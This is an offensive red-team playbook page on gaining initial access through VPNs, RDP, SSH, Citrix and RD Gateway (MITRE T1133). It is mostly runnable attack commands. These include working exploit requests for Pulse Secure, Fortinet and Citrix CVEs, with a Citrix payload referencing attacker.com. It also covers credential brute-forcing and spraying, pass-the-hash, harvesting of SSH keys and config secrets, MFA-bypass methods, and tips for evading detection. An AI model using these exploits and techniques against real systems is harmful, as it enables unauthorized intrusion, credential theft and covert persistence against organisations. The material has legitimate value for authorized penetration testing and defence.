# External Remote Services

> **MITRE ATT&CK**: Initial Access > T1133 - External Remote Services
> **Platforms**: Windows, Linux, Network Appliances
> **Required Privileges**: Valid credentials (stolen, sprayed, or default)
> **OPSEC Risk**: Low-Medium (legitimate remote access; blends with normal traffic)

## Strategic Overview

External remote services -- VPN gateways, RDP, SSH, Citrix, and Remote Desktop Gateway --
are the front doors that organizations intentionally expose to the internet. For the Red
Team Lead, these services represent the most operationally clean initial access vector:
authenticating through a legitimate remote access service generates expected traffic
patterns, lands you on the internal network with a stable connection, and provides the
same access as a legitimate employee or contractor. The challenge is obtaining valid
credentials (covered in password-attacks.md) or exploiting vulnerabilities in the remote
access infrastructure itself. VPN appliance vulnerabilities have been a dominant initial
access vector for nation-state actors: Pulse Secure (CVE-2019-11510), Fortinet
(CVE-2018-13379), Palo Alto GlobalProtect (CVE-2024-3400), and Citrix NetScaler
(CVE-2023-3519) have all been widely exploited. Once authenticated, the remote access
session provides a stable, encrypted tunnel that blends perfectly with legitimate traffic.

## Technical Deep-Dive

### VPN Exploitation

```bash
# Step 1: Identify VPN solution via reconnaissance
# Shodan queries for common VPN appliances
shodan search "http.title:\"GlobalProtect Portal\"" "org:Target Corp"
shodan search "http.title:\"Pulse Connect Secure\"" "org:Target Corp"
shodan search "http.title:\"Citrix Gateway\"" "org:Target Corp"
shodan search "http.favicon.hash:-1166125415" "org:Target Corp"    # Fortinet

# Nmap service detection
nmap -sV -p 443,4443,8443,10443 vpn.target.com

# SSL certificate analysis reveals VPN product
echo | openssl s_client -connect vpn.target.com:443 2>/dev/null | \
  openssl x509 -noout -subject -issuer

# Step 2: Check for known vulnerabilities

# Pulse Secure / Ivanti Connect Secure CVE-2019-11510 (arbitrary file read)
curl -sk "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet FortiOS CVE-2018-13379 (path traversal, credential disclosure)
curl -sk "https://vpn.target.com:4443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Palo Alto GlobalProtect CVE-2024-3400 (command injection in GlobalProtect)
# Exploitation requires crafted SESSID cookie with command injection payload
# Check version: curl -sk https://vpn.target.com/global-protect/portal/css/login.css

# Citrix NetScaler CVE-2023-3519 (unauthenticated RCE)
# Stack buffer overflow in NSPPE process
# Check version via HTTP headers or login page source

# Ivanti Connect Secure CVE-2024-21887 + CVE-2023-46805 (auth bypass + command injection)
# Chain: authentication bypass -> command injection -> webshell deployment
```

### VPN Credential-Based Access

```bash
# After obtaining credentials via spraying or phishing:

# OpenConnect (open-source VPN client supporting multiple protocols)
openconnect --protocol=gp vpn.target.com -u username    # GlobalProtect
openconnect --protocol=pulse vpn.target.com -u username  # Pulse Secure
openconnect --protocol=nc vpn.target.com -u username     # Juniper

# Cisco AnyConnect
# Install AnyConnect client, connect to vpn.target.com with stolen creds

# FortiClient
# Connect to vpn.target.com:10443 with FortiClient and stolen credentials

# Post-connection verification
ip addr show      # New tunnel interface (tun0, utun0)
ip route show     # New routes to internal networks
nslookup dc01.domain.local    # Internal DNS resolution
ping 10.10.10.50              # Internal connectivity

# VPN split-tunnel vs full-tunnel
# Split-tunnel: Only target network traffic goes through VPN (attacker internet visible)
# Full-tunnel: All traffic routes through VPN (attacker internet hidden, but all traffic monitored)
# Check: ip route show - if default route points to VPN, it's full-tunnel
```

### RDP Exploitation and Access

```bash
# Discover exposed RDP services
shodan search "port:3389 org:\"Target Corp\""
masscan -p 3389 --rate 1000 target-range/24 -oL rdp-hosts.txt
nmap -sV -p 3389 --script rdp-enum-encryption,rdp-ntlm-info target-range/24

# Extract domain info from RDP NTLM authentication
nmap -p 3389 --script rdp-ntlm-info 10.10.10.50
# Reveals: NetBIOS domain name, DNS domain name, FQDN, OS version

# Brute-force RDP (use with caution - lockout risk)
hydra -l administrator -P passwords.txt rdp://10.10.10.50 -t 4 -W 5
crowbar -b rdp -s 10.10.10.50/32 -u admin -C passwords.txt -n 4

# RDP with valid credentials
xfreerdp /v:10.10.10.50 /u:domain\\user /p:password /cert:ignore /dynamic-resolution
rdesktop 10.10.10.50 -u user -p password -d domain

# RDP with pass-the-hash (requires Restricted Admin mode enabled)
xfreerdp /v:10.10.10.50 /u:administrator /pth:NTLM_HASH /cert:ignore

# RDP over non-standard ports (common for internet-exposed RDP)
xfreerdp /v:10.10.10.50:8443 /u:user /p:password /cert:ignore

# BlueKeep (CVE-2019-0708) - unauthenticated RCE in RDP
# Check vulnerability without exploitation
nmap -p 3389 --script rdp-vuln-ms12-020 10.10.10.50
# Metasploit: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

### Citrix Gateway Attacks

```bash
# Citrix NetScaler Gateway - common enterprise remote access

# Identify Citrix instances
shodan search "http.title:\"Citrix Gateway\"" "org:Target Corp"
shodan search "http.title:\"NetScaler Gateway\"" "org:Target Corp"

# CVE-2019-19781 (Citrix ADC / Gateway - directory traversal + RCE)
# Check for vulnerability
curl -sk "https://citrix.target.com/vpn/../vpns/cfg/smb.conf" --path-as-is
# If smb.conf contents returned, vulnerable

# Exploitation: write template file, trigger execution
curl -sk "https://citrix.target.com/vpn/../vpns/portal/scripts/newbm.pl" \
  --path-as-is -X POST \
  -d "url=http://attacker.com&title=[%25+template.new({'BLOCK'='exec(\"id\")'})%25]&desc=test&UI_inuse=RfWeb"

# CVE-2023-3519 (Citrix NetScaler - unauthenticated RCE)
# Memory corruption in NSPPE component
# Requires specific build version identification first

# Post-exploitation on Citrix
# Citrix runs on BSD/Linux - standard Linux post-exploitation applies
# Check /nsconfig/ns.conf for VPN users, LDAP bind credentials
# Check /var/nstmp/ for session tokens
cat /nsconfig/ns.conf | grep -i "bind\|password\|secret"
```

### SSH Attacks

```bash
# SSH brute-force (common for Linux servers and network devices)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.50 -t 4 -W 3
medusa -h 10.10.10.50 -u root -P passwords.txt -M ssh -t 4
ncrack -p 22 --user root -P passwords.txt 10.10.10.50

# SSH with stolen private key
chmod 600 stolen_id_rsa
ssh -i stolen_id_rsa user@10.10.10.50

# SSH key-based enumeration (user enumeration via timing)
# CVE-2018-15473 - OpenSSH user enumeration
python3 ssh_user_enum.py --userlist users.txt --host 10.10.10.50

# SSH tunneling for pivoting (post-access)
# Local port forward: access internal service through SSH
ssh -L 8080:internal-host:80 user@10.10.10.50

# Dynamic SOCKS proxy through SSH
ssh -D 1080 user@10.10.10.50
# Configure tools to use SOCKS5 proxy at 127.0.0.1:1080

# SSH over non-standard ports
nmap -sV -p 2222,8022,22222 10.10.10.0/24 --open
ssh -p 2222 user@10.10.10.50
```

### Microsoft Remote Desktop Gateway / RD Web Access

```bash
# RD Web Access discovery
shodan search "http.title:\"RD Web Access\"" "org:Target Corp"
# Default URL: https://rdweb.target.com/RDWeb/

# RD Gateway allows RDP connections through HTTPS (port 443)
# Credential spraying against RD Web login
hydra -l user@domain.com -P passwords.txt https-form-post \
  "/RDWeb/Pages/en-US/login.aspx:DomainUserName=^USER^&UserPass=^PASS^:Incorrect"

# Connect through RD Gateway with valid credentials
xfreerdp /v:internal-host /u:domain\\user /p:password \
  /g:rdgateway.target.com /gu:domain\\user /gp:password /cert:ignore

# RD Web Access provides a web interface to published RemoteApp programs
# These run on the terminal server with the connecting user's permissions
# Breakout: RemoteApp restrictions can often be bypassed to get full desktop
```

### MFA Bypass on Remote Services

```bash
# Common MFA bypass techniques for remote services:

# 1. MFA fatigue / push notification bombing
# Send repeated MFA push notifications until user approves
# Effective against Microsoft Authenticator, Duo push notifications
# Now mitigated by number matching in modern implementations

# 2. SIM swapping for SMS-based MFA
# Social engineering mobile carrier to transfer target's number
# Receive SMS MFA codes on attacker's device

# 3. Evilginx2 transparent proxy (covered in phishing-payloads.md)
# Captures session tokens after MFA completion
# Works against any MFA method

# 4. Token theft from VPN client configurations
# Some VPN clients store MFA tokens/seeds locally
# FortiClient: %APPDATA%\FortiClient\FortiClient.ini
# Check for stored TOTP seeds or session tokens

# 5. Legacy protocol abuse
# Some services support legacy protocols without MFA
# Exchange: ActiveSync, POP3, IMAP may bypass modern auth MFA
# Azure AD: Legacy authentication endpoints may not enforce MFA

# Check Azure AD legacy auth availability
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/token" \
  -d "grant_type=password&username=user@target.com&password=Password1!&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&resource=https://graph.microsoft.com"
```

### Jump Box / Bastion Host Compromise

```bash
# Jump boxes are centralized access points - high-value targets

# Identify jump boxes via:
# - Network architecture documentation (if obtained)
# - RDP/SSH services accessible from VPN segments
# - Hosts with connections to multiple network zones
# - Named patterns: jump01, bastion, gw, gateway

# Post-compromise of jump box:
# - Extract stored credentials (RDP saved connections, SSH keys, PuTTY sessions)
# - Monitor for credential input (keylogging legitimately connecting admins)
# - Use as pivot point to access segmented networks
# - Check command history: .bash_history, PowerShell transcript logs

# PuTTY stored sessions and credentials (Windows)
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
# SSH keys in common locations
dir /s /b C:\Users\*\.ssh\id_rsa C:\Users\*\.ssh\id_ed25519

# Linux jump box credential harvesting
cat ~/.ssh/config           # SSH configurations and key paths
cat ~/.ssh/known_hosts      # Previously connected hosts
cat ~/.bash_history         # Historical commands with possible passwords
```

## Detection & Evasion

### What Defenders See
- VPN authentication logs (successful/failed logins, source IPs, user agents)
- RDP event logs: Event ID 4624 (Type 10 = RemoteInteractive logon)
- SSH auth.log / secure log entries for authentication attempts
- Network flow data showing remote access session duration and volume
- MFA push notification logs and approval/denial events
- Geographic anomalies (user logging in from unusual locations)

### Why External Remote Services Are Low-Risk for Attackers
- Traffic is encrypted (VPN, RDP TLS, SSH) -- content inspection is not possible
- Authentication events are expected and high-volume (difficult to spot anomalies)
- Successful authentication with valid credentials generates identical logs to legitimate access
- Session duration and traffic patterns can mimic normal user behavior

### Evasion Techniques
- Use credentials during target organization's business hours
- Match geographic location expectations (VPN from expected regions)
- Avoid triggering impossible travel alerts (no rapid location changes)
- Use the same VPN client and user-agent as legitimate users
- Establish sessions of normal duration (avoid 24/7 persistent connections)

## Cross-References

- **Active Scanning** (01-reconnaissance/active-scanning.md) -- discover exposed remote services
- **Password Attacks** (02-initial-access/password-attacks.md) -- obtain credentials for remote access
- **Phishing** (02-initial-access/phishing-payloads.md) -- Evilginx2 captures remote service sessions
- **Trusted Relationships** (02-initial-access/trusted-relationships.md) -- vendor remote access exploitation
- **Cloud Recon** (01-reconnaissance/cloud-recon.md) -- cloud-hosted remote access infrastructure

## References

- MITRE ATT&CK T1133: https://attack.mitre.org/techniques/T1133/
- CISA VPN Security Guidance: https://www.cisa.gov/news-events/alerts/2024/01/31/cisa-issues-emergency-directive-regarding-ivanti-vulnerabilities
- Citrix CVE-2019-19781: https://support.citrix.com/article/CTX267027
- Fortinet CVE-2018-13379: https://www.fortiguard.com/psirt/FG-IR-18-384
- Pulse Secure CVE-2019-11510: https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101
- BlueKeep CVE-2019-0708: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708
- Hydra: https://github.com/vanhauser-thc/thc-hydra
